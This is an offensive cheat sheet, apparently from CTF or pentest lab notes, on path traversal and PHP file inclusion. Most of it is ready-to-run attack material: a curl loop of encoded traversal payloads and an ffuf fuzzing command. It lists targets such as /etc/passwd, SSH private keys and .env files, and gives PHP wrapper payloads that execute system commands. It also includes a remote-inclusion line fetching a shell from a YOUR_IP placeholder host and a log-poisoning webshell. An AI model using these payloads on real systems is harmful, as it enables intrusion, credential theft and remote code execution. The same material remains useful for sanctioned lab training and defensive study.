# Path traversal & File Inclusion (CWE-22, CWE-98)

**Signs**: `?file=report.pdf`, `?page=about`, `?lang=en`, `?template=`, `/download/<name>`,
`/static/<path>`, image loaders. Error messages like `No such file: /var/www/pages/x.php`.

## 1. Traversal probes
```bash
for p in '../../../../etc/passwd' '....//....//....//etc/passwd' '..%2f..%2f..%2fetc%2fpasswd' \
         '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' '..%252f..%252f..%252fetc%252fpasswd' \
         '/etc/passwd' '..\..\..\windows\win.ini' '../../../../etc/passwd%00' ; do
  echo "== $p"; curl -s "$T/view?file=$p" | head -3; done
ffuf -u "$T/view?file=FUZZ" -w wordlists/fuzz/lfi-jhaddix.txt -fs <baseline> -mc 200
```
Bypasses: nested `....//`, URL/double encoding, absolute paths, prefix kept (`/var/www/images/../../../etc/passwd`),
forced suffix (`.php` appended → null byte `%00` on old PHP, or target `.php` files), `/./`, case.

## 2. What to read
`/flag/flag`, `/flag.txt`, `/etc/lab_flag`, `/proc/self/environ` (FLAG env), `/proc/self/cmdline`,
`/proc/self/cwd/app.py`, app source (`app.py`, `config.php`, `.env`), `/etc/passwd` (users),
`/home/<u>/.ssh/id_rsa`, `/var/log/apache2/access.log`.

## 3. PHP wrappers (include/require)
```
?page=php://filter/convert.base64-encode/resource=index      # read PHP source (base64)
?page=php://filter/convert.base64-encode/resource=/flag/flag
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+   # RCE if allow_url_include
?page=php://input   (POST body: <?php system('id'); ?>)
?page=expect://id
?page=http://YOUR_IP/shell.txt                                # RFI if allow_url_include=On
```

## LFI → RCE
- **Log poisoning**: send `User-Agent: <?php system($_GET['c']); ?>`, then include
  `/var/log/apache2/access.log&c=id` (or `/proc/self/fd/N`, nginx logs).
- Include an uploaded file (avatar with PHP inside) → [file-upload](file-upload.md).
- Session files: put PHP in a session var, include `/var/lib/php/sessions/sess_<PHPSESSID>`.
- PHP filter chains (no upload needed): `php_filter_chain_generator.py`.

Seen in: DVWA/bWAPP/Mutillidae "File Inclusion" / "Directory Traversal" labs.
